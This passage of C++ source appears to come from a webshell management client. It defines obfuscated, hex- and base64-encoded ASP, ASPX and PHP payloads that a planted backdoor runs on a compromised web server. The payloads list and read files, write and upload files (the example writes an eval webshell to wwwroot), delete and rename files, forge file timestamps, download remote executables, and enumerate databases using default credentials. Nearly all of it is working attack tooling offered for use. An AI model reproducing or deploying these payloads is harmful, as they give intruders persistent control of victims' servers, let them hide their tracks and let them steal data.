		"E4E616D6526636872283929264644284C2E446174654C6173744D6F6469666965642926636872283929264C2E73697A65266"
		"3687228392926432E47657446696C65284C2E50617468292E6174747269627574657326636872283130293A4E6578743A456"
		"E64204966\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")";/* &z1=433A5C5C5757575C5C2E5C5C == C:\\WWW\\.\\  */

	szFileGetFiles[1] =	Ini_szASPX_POST_DATA;//&z1=QzpcXFdXV1xc

	szFileGetFiles[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");"
		"$D=base64_decode($_POST[\"z1\"]);$F=@opendir($D);if($F==NULL){echo(\"ERROR:// Path Not Found Or No Permission!\");"
		"}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.\"/\".$N;$T=@date(\"Y-m-d H:i:s\",@filemtime($P));"
		"$E=is_readable($P)?\"r\":\"-\";$E.=is_writable($P)?\"w\":\"-\";$R=\"\\t\".$T.\"\\t\".@filesize($P).\"\\t\".$E.\"\\r\\n\";"
		"if(@is_dir($P))$M.=$N.\"/\".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};exit(\"|<-\");");/*&z1=QzpcXFdXV1xc == C:\\WWW\\ */

	szFileGetFiles[3] =	"";
	//////////////////////////////////////////////////////////////////////////																	以上 获取文件列表
	szFileGetFileContent[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"526573706F6"
		"E73652E5772697465284372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A6563742"
		"2292E4F70656E5465787466696C65286264285265717565737428227A312229292C312C46616C7365292E72656164616C6C2"
		"93A496620457272205468656E3A526573706F6E73652E577269746528224552524F523A2F2F2022264572722E44657363726"
		"97074696F6E293A4572722E436C6561723A456E64204966\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Respon"
		"se.End\"\")\")&z1=";//633A5C5C696E65747075625C5C777777726F6F745C5C312E617370
	szFileGetFileContent[1] =	Ini_szASPX_POST_DATA + "&z1=";//YzpcXGluZXRwdWJcXHd3d3Jvb3RcXDEuYXNw  c:\\inetpub\\wwwroot\\1.asp

	szFileGetFileContent[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$F"
		"=base64_decode($_POST[\"z1\"]);$P=@fopen($F,\"r\");echo(@fread($P,filesize($F)));@fclose($P);;echo(\"|<-\");die();") + "&z1=";//QzpcXFdXV1xcMS5hc3A%3D

	szFileGetFileContent[3]	=	"";
	//////////////////////////////////////////////////////////////////////////																	以上获取文本内容
	szFileSaveFileContent[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29"
		"%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.W"
		"rite(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"43726561"
		"74654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422292E437265617465546578744"
		"6696C65282222266264285265717565737428227A31222929262222292E5772697465282222265265717565737428227A32"
		"2229262222293A496620457272205468656E3A533D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4"
		"56C73653A533D2231223A526573706F6E73652E57726974652853293A456E64204966\"\"\"\")):Response.Write(\"\""
		"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";//633A5C5C696E65747075625C5C777777726F6F745C5C312E617370&z2=000000%3C%25eval%20request%28chr%%2849%29%29%25%3E1

	szFileSaveFileContent[1] =	Ini_szASPX_POST_DATA + "&z1=";
	//YzpcXGluZXRwdWJcXHd3d3Jvb3RcXDEuYXNw&z2=6769663839610D0A303030303030303030303030303030303C256576616C2072657175657374286368722834392929253E313131

	szFileSaveFileContent[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;ec"
		"ho @fwrite(fopen(base64_decode($_POST[\"z1\"]),\"w\"),base64_decode($_POST[\"z2\"]))?\"1\":\"0\";;ec"
		"ho(\"|<-\");die();") + "&z1=";//QzpcXFdXV1xcMS5hc3A%3D&z2=PCUNCmV2YWwgcmVxdWVzdChjaHIoNDkpKQ0KDQolPg%3D%3D

	szFileSaveFileContent[3] =	"";
	//////////////////////////////////////////////////////////////////////////																	以上保存文件内容
	szFileUpload[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D206C2"
		"C73732C66662C543A66663D6264287265717565737428227A312229293A73733D5265717565737428227A3222293A6C3D4C6"
		"56E287373293A53657420533D5365727665722E4372656174654F626A656374282241646F64622E53747265616D22293A576"
		"9746820533A2E547970653D313A2E4D6F64653D333A2E4F70656E3A4966205265717565737428227A3322293E30205468656"
		"E3A2E4C6F616446726F6D46696C652022222666662622223A2E506F736974696F6E3D2E53697A653A456E642049663A73657"
		"42072733D4372656174654F626A656374282241444F44422E5265636F726473657422293A72732E6669656C64732E6170706"
		"56E6420226262222C3230352C6C2F323A72732E6F70656E3A72732E6164646E65773A72732822626222293D73732B6368726"
		"22830293A72732E7570646174653A2E57726974652072732822626222292E6765746368756E6B286C2F32293A72732E636C6"
		"F73653A5365742072733D4E6F7468696E673A2E506F736974696F6E3D303A2E53617665546F46696C6520222226666626222"
		"22C323A2E436C6F73653A456E6420576974683A53657420533D4E6F7468696E673A496620457272205468656E3A543D45727"
		"22E4465736372697074696F6E3A4572722E436C6561723A456C73653A543D2231223A456E642049663A526573706F6E73652"
		"E5772697465285429\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
	//633A5C5C696E65747075625C5C777777726F6F745C5C312E747874  &z2=  676F6F676C650D0A333231  &z3=0"//z3 = 1，追加文本
	//c:\\inetpub\\wwwroot\\1.txt

	szFileUpload[1] =	Ini_szASPX_POST_DATA + "&z1=";
	//YzpcXGluZXRwdWJcXHd3d3Jvb3RcXDEuYXNw&z2=6769663839610D0A3030303030303

	szFileUpload[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$f="
		"base64_decode($_POST[\"z1\"]);$c=$_POST[\"z2\"];$c=str_replace(\"\\r\",\"\",$c);$c=str_replace(\"\\n"
		"\",\"\",$c);$buf=\"\";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode(\"%\".substr($c,$i,2));echo(@fwri"
		"te(fopen($f,$_POST[\"z3\"]),$buf)?\"1\":\"0\");exit(\"|<-\");") + "&z1=";
	//QzpcXHRtcFxc6ay85ZOlc3RydXRzMua1i%2BivleW3peWFty5leGU%3D&z2=	C:\\tmp\\xxxxx.exe&z3=a/w

	szFileUpload[3] =	"";
	//////////////////////////////////////////////////////////////////////////																	以上上传文件
	szFileDelete[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20503"
		"A503D5265717565737428227A3122293A5365742046533D4372656174654F626A6563742822536372697074696E672E46696"
		"C6553797374656D4F626A65637422293A49662046532E466F6C6465724578697374732850293D74727565205468656E3A465"
		"32E44656C657465466F6C6465722850293A456C73653A46532E44656C65746546696C652850293A456E642049663A5365742"
		"046533D4E6F7468696E673A496620457272205468656E3A533D224552524F523A2F2F2022264572722E44657363726970746"
		"96F6E3A456C73653A533D2231223A526573706F6E73652E57726974652853293A456E64204966\"\"\"\")):Response.Wri"
		"te(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";//c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5C4K.exe

	szFileDelete[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szFileDelete[1].Replace("%szBase64EvalCode%", "dmFyIFA6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejEiXTtpZihTeXN0ZW0uSU8uRGlyZW"
		"N0b3J5LkV4aXN0cyhQKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5EZWxldGUoUCx0cnVlKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5EZW"
		"xldGUoUCk7fVJlc3BvbnNlLldyaXRlKCIxIik7");
	//c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5C4K.exe

	szFileDelete[2] =Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;fu"
		"nction df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p.\"/\".$f;if((is_dir($pf))&&($f!=\".\")&&($f!="
		"\"..\")){@chmod($pf,0777);df($pf);}if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m->close();@chm"
		"od($p,0777);return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"]"
		";if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?\"1\":\"0\":\"0\");};echo(\"|<-\")"
		";die();") + "&z1=";//C%3A%5C%5Ctmp%5C%5Cxuetr.exe
	
	szFileDelete[3] =	"";
	//////////////////////////////////////////////////////////////////////////																	以上删除文件
	szFileReName[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53463D52657"
		"17565737428227A3122293A44463D5265717565737428227A3222293A5365742046733D4372656174654F626A65637428225"
		"36372697074696E672E46696C6553797374656D4F626A65637422293A49662046732E466F6C6465724578697374732853462"
		"9205468656E3A46732E4D6F7665466F6C6465722053462C44463A456C73653A46732E4D6F766546696C652053462C44463A4"
		"56E642049663A5365742046733D4E6F7468696E673A496620457272205468656E3A53493D224552524F523A2F2F202226457"
		"2722E4465736372697074696F6E3A456C73653A53493D2231223A456E642049663A526573706F6E73652E577269746528534"
		"929\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";//

	szFileReName[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szFileReName[1].Replace("%szBase64EvalCode%", "dmFyIHNyYz1SZXF1ZXN0Lkl0ZW1bInoxIl0sZHN0PVJlcXVlc3QuSXRlbVsiejIiXT"
		"tpZiAoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoc3JjKSl7U3lzdGVtLklPLkRpcmVjdG9yeS5Nb3ZlKHNyYyxkc3QpO31lbH"
		"Nle1N5c3RlbS5JTy5GaWxlLk1vdmUoc3JjLGRzdCk7fVJlc3BvbnNlLldyaXRlKCIxIik7");

	szFileReName[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$src=m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$dst=m?stripslashes($_POS"
		"T[\"z2\"]):$_POST[\"z2\"];echo(rename($src,$dst)?\"1\":\"0\");;echo(\"|<-\");die();") + "&z1=";

	szFileReName[3] =	"";//1=I&z0=GB2312&z1=c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5Cdb.mdb&z2=c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5Cdb_.mdb
	//////////////////////////////////////////////////////////////////////////																	以上文件重命名
	szFileChangeTime[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"464E3D52657"
		"17565737428227A3122293A544D3D5265717565737428227A3222293A41413D53706C697428464E2C225C5C22293A50543D2"
		"2223A466F7220693D4C426F756E642841412920546F2055426F756E64284141292D313A50543D505426414128692926225C2"
		"23A4E6578743A4E4D3D41412855426F756E6428414129293A5365727665722E4372656174654F626A65637428225368656C6"
		"C2E4170706C69636174696F6E22292E4E616D655370616365285054292E50617273654E616D65284E4D292E4D6F646966796"
		"46174653D544D3A496620457272205468656E3A53493D224552524F523A2F2F2022265054264572722E44657363726970746"
		"96F6E3A4572722E436C6561723A456C73653A53493D2231223A456E642049663A526573706F6E73652E57726974652853492"
		"9\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
		//c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5C4K.exe&z2=2013-01-01%2023%3A59%3A59
		
	szFileChangeTime[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szFileChangeTime[1].Replace("%szBase64EvalCode%", "dmFyIEREPVJlcXVlc3QuSXRlbVsiejEiXSxUTT1SZXF1ZXN0Lkl0ZW1bInoyIl07aW"
		"YoU3lzdGVtLklPLkRpcmVjdG9yeS5FeGlzdHMoREQpKXtTeXN0ZW0uSU8uRGlyZWN0b3J5LlNldENyZWF0aW9uVGltZShERCxUTS"
		"k7U3lzdGVtLklPLkRpcmVjdG9yeS5TZXRMYXN0V3JpdGVUaW1lKERELFRNKTtTeXN0ZW0uSU8uRGlyZWN0b3J5LlNldExhc3RBY2"
		"Nlc3NUaW1lKERELFRNKTt9ZWxzZXtTeXN0ZW0uSU8uRmlsZS5TZXRDcmVhdGlvblRpbWUoREQsVE0pO1N5c3RlbS5JTy5GaWxlLl"
		"NldExhc3RXcml0ZVRpbWUoREQsVE0pO1N5c3RlbS5JTy5GaWxlLlNldExhc3RBY2Nlc3NUaW1lKERELFRNKTt9UmVzcG9uc2UuV3"
		"JpdGUoIjEiKTs%3D");
	//c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5Cdb_.mdb&z2=2013-01-01%2023%3A59%3A59

	szFileChangeTime[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$FN=m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$TM=strtotime(m?stripslash"
		"es($_POST[\"z2\"]):$_POST[\"z2\"]);if(file_exists($FN)){echo(@touch($FN,$TM,$TM)?\"1\":\"0\");}else{"
		"echo(\"0\");};;echo(\"|<-\");die();") + "&z1=";
		//C%3A%5C%5Ctmp%5C%5Cx_.txt&z2=2013-01-01%2023%3A59%3A59
		
	szFileChangeTime[3] =	"";//=K&z0=GB2312&z1=c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5Cdb_.mdb&z2=2013-01-01%2023%3A59%3A59
	//////////////////////////////////////////////////////////////////////////																	以上修改文件时间
	szFileNewDir[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"53657420467"
		"33D4372656174654F626A6563742822536372697074696E672E46696C6553797374656D4F626A65637422293A46732E43726"
		"5617465466F6C646572285265717565737428227A312229293A5365742046733D4E6F7468696E673A4966204572722054686"
		"56E3A533D224552524F523A2F2F2022264572722E4465736372697074696F6E3A456C73653A533D2231223A456E642049663"
		"A526573706F6E73652E5772697465285329\"\"\"\")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
		//c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5C1

	szFileNewDir[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szFileNewDir[1].Replace("%szBase64EvalCode%", "dmFyIEQ9UmVxdWVzdC5JdGVtWyJ6MSJdO1N5c3RlbS5JTy5EaXJlY3Rvc"
		"nkuQ3JlYXRlRGlyZWN0b3J5KEQpO1Jlc3BvbnNlLldyaXRlKCIxIik7");
	//c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5C1

	szFileNewDir[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$f=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];echo(mkdir($f)?\"1\":\"0\""
		");;echo(\"|<-\");die();") + "&z1=";//C%3A%5C%5Ctmp%5C%5C1

	szFileNewDir[3] =	"";//1=J&z0=GB2312&z1=c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5C1
	//////////////////////////////////////////////////////////////////////////																	以上新建文件夹
	szWget[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20534"
		"93A53657420783D4372656174654F626A65637428224D6963726F736F66742E584D4C4854545022293A782E4F70656E20224"
		"74554222C2222266264285265717565737428227A312229292622222C303A782E53656E6428293A496620457272205468656"
		"E3A53493D224552524F523A2F2F2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A73657"
		"420733D4372656174654F626A656374282241444F44422E53747265616D22293A732E4D6F64653D333A732E547970653D313"
		"A732E4F70656E28293A732E577269746520782E526573706F6E7365426F64793A732E53617665546F46696C6520222226626"
		"4285265717565737428227A322229292622222C323A496620457272205468656E3A53493D224552524F523A2F2F202226457"
		"2722E4465736372697074696F6E3A4572722E436C6561723A456C73653A53493D2231223A456E642049663A53657420783D4"
		"E6F7468696E673A53657420733D4E6F7468696E673A456E642049663A526573706F6E73652E577269746528534929\"\"\"\""
		")):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";
		//687474703A2F2F3132372E302E302E312F312E657865&z2=433A5C5C312E657865

	szWget[1] =	Ini_szASPX_POST_DATA + "&z1=";//aHR0cDovLzEyNy4wLjAuMS8xLmV4ZQ%3D%3D&z2=QzpcXDEuZXhl

	szWget[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$f"
		"R=base64_decode($_POST[\"z1\"]);$fL=base64_decode($_POST[\"z2\"]);$F=@fopen($fR,chr(114));$L=@fopen("
		"$fL,chr(119));if($F && $L){while(!feof($F))@fwrite($L,@fgetc($F));@fclose($F);@fclose($L);echo(\"1\""
		");}else{echo(\"0\");};echo(\"|<-\");die();") + "&z1=";
		//aHR0cDovLzEyNy4wLjAuMS8xLmV4ZQ%3D%3D&z2=QzpcXDEuZXhl

	szWget[3] =	"";//=L&z0=GB2312&z1=http%3A%2F%2F127.0.0.1%2F1.exe&z2=C%3A%5C%5C1.exe
	//////////////////////////////////////////////////////////////////////////																	以上 WGET
	szFileDownFile[0] =	Ini_szASP_POST_DATA + "Function+bd%28byVal+s%29%3AFor+i%3D1+To+"
		"Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExe"
		"cute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AEx"
		"ecute%28%22%22%22%22bd%3Dbd%26chr%%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%"
		"22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%%2810%29%26%22%22Next%3AEnd+Function:Response.Wri"
		"te(\"\"\"\"->|\"\"\"\"):Execute(\"\"\"\"On+Error+Resume+Next:\"\"\"\"%26bd(\"\"\"\"44696D20692"
		"C632C723A53657420533D5365727665722E4372656174654F626A656374282241646F64622E53747265616D22293A4966204"
		"E6F7420457272205468656E3A5769746820533A2E4D6F64653D333A2E547970653D313A2E4F70656E3A2E4C6F616446726F6"
		"D46696C65285265717565737428227A312229293A693D303A633D2E53697A653A723D313032343A5768696C6520693C633A5"
		"26573706F6E73652E42696E6172795772697465202E526561642872293A526573706F6E73652E466C7573683A693D692B723"
		"A57656E643A2E436C6F73653A53657420533D4E6F7468696E673A456E6420576974683A456C73653A526573706F6E73652E4"
		"2696E617279577269746520224552524F523A2F2F2022264572722E4465736372697074696F6E3A456E64204966\"\"\"\")"
		"):Response.Write(\"\"\"\"|<-\"\"\"\"):Response.End\"\")\")&z1=";//c%3A%5C%5Cinetpub%5C%5Cwwwroot%5C%5C1.asp

	szFileDownFile[1] =	Ini_szASPX_POST_DATA + "&z1=";
	szFileDownFile[1].Replace("%szBase64EvalCode%", "UmVzcG9uc2UuV3JpdGVGaWxlKFJlcXVlc3QuSXRlbVsiejEiXSk7");

	szFileDownFile[2] =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$F"
		"=get_magic_quotes_gpc()?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$fp=@fopen($F,\"r\");if(@fgetc($"
		"fp)){@fclose($fp);@readfile($F);}else{echo(\"ERROR:// Can Not Read\");};echo(\"|<-\");die();") + "&z1=";//C%3A%5C%5Ctmp%5C%5Cx.txt

	szFileDownFile[3] =	"";
	//////////////////////////////////////////////////////////////////////////																	以上下载文件
	szDataPhpMysql =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$T=@mysql_connect($h"
		"st,$usr,$pwd);$q=@mysql_query(\"SHOW DATABASES\");while($rs=@mysql_fetch_row($q)){echo(trim($rs[0])."
		"chr(9));}@mysql_close($T);;echo(\"|<-\");die();") + "&z1=";//localhost&z2=root&z3=root

	szDataPhpMssql =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$T=@mssql_connect($h"
		"st,$usr,$pwd);$q=@mssql_query(\"select [name] from master.dbo.sysdatabases order by 1\",$T);while($r"
		"s=@mssql_fetch_row($q)){echo(trim($rs[0]).chr(9));}@mssql_free_result($q);@mssql_close($T);;echo(\"|"
		"<-\");die();") + "&z1=";//localhost&z2=sa&z3=

	szDataPhpOracle =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$sid=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$H=@Ora_Logon(\"${us"
		"r}/${pwd}@${sid}\",\"\");if(!$H){echo(\"ERROR:// Login Failed!\");}else{$T=@ora_open($H);@ora_commit"
		"off($H);$q=@ora_parse($T,\"SELECT USERNAME FROM ALL_USERS ORDER BY 1\");if(ora_exec($T)){while(ora_f"
		"etch($T)){echo(trim(ora_getcolumn($T,0)).chr(9));}}@ora_close($T);};echo(\"|<-\");die();") + "&z1=";//localhost&z2=dbuser&z3=dbpwd

	szDataPhpInformix =	Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");;$m"
		"=get_magic_quotes_gpc();$hst=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$usr=$m?stripslashes($_P"
		"OST[\"z2\"]):$_POST[\"z2\"];$pwd=$m?stripslashes($_POST[\"z3\"]):$_POST[\"z3\"];$T=(strlen($usr)>0)?"
		"@ifx_connect($hst,$usr,$pwd):@ifx_connect($hst);$q=@ifx_query(\"SELECT username FROM SYSUSERS WHERE "
		"usertype='D' ORDER BY username\",$T);echo(\"informix\".chr(9));while($rs=@ifx_fetch_row($q)){echo(tr"
		"im($rs[username]).chr(9));}@ifx_close($T);;echo(\"|<-\");die();") + "&z1=";//localhost&z2=dbuser&z3=dbpwd

	szDataPhpPostgreSQL =Ini_szPHP_POST_DATA + MyBase64Encode(-1, Ini_szPHP_POST_Z0_DATA + "echo(\"->|\");$m="
		"get_magic_quotes_gpc();$h=$m?stripslashes($_POST[\"z1\"]):$_POST[\"z1\"];$s=$m?stripslashes($_POST[\""
